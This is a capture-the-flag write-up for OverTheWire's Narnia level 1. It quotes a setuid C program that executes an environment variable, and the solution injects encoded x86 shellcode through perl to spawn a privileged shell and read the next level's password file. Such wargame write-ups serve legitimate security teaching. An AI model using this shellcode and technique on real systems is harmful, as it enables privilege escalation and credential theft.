### OverTheWire Narnia-Level1-2


## Problem explanation and Relevant Background Knowledge

The source code of narnia1.c reveals a critical vulnerability

#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}


# Shellcode Injection Vulnerability

The program:

-Retrieves the EGG environment variable

-Assigns it to a function pointer

-Executes it directlu

# Environment

-ASLR:disabled

-Stack:executable(GNU_STACK=RWE)

-Binary:32-bit ELF,intel x86

-Privileges: setuid-- runs as narnia2


## Solution Process

We inject shellcode into the EGG environment variable

The shellcode:

-Executes execve("/bin/sh", "-p")
-Spawn a shell with effective UID = narnia2

Delivering raw shellcode bytes correctly:

-Bash can misinterpret binary data
-Python3 pint() outputs text,not raw bytes

So we use perl,which outputs raw bytes reliably

## Commands Used

The exploit was basically this:

EGG=`perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80".
     "\x6c\x0e\xff\x01\x80\xe9\x01\x75".
       "\xf6\xeb\x05\xe8\xea\xff\xff\xff".
     "\x6b\x0c\x59\x9a\x53\x67\x69\x2e".
     "\x71\x8a\xe2\x53\x6b\x69\x69\x30".
     "\x63\x62\x74\x69\x30\x63\x6a\x6f".
     "\x8a\xe4\x53\x52\x54\x8a\xe2\xce".
     "\x81"'` ./narnia1

#Shell spawned as narnia2

    cat /etc/narnia_pass/narnia2



## Key Concepts Learned
 

# Function pointers in C 

A function pointer stores the address of executable code.
If user input controls it,it leads to direct code execution.
# Shellcode Injection

Injecting machine code into memory and forcing execution.

# Why perl over python3

perl allows direct emission of raw byte sequences.
Python3 requires sys.stdout.buffer.write() to achieve the same.

# Backtick substitution in bash:

-The syntax `command` executes a command and substitutes its raw output,allowing binary data injection into variables.
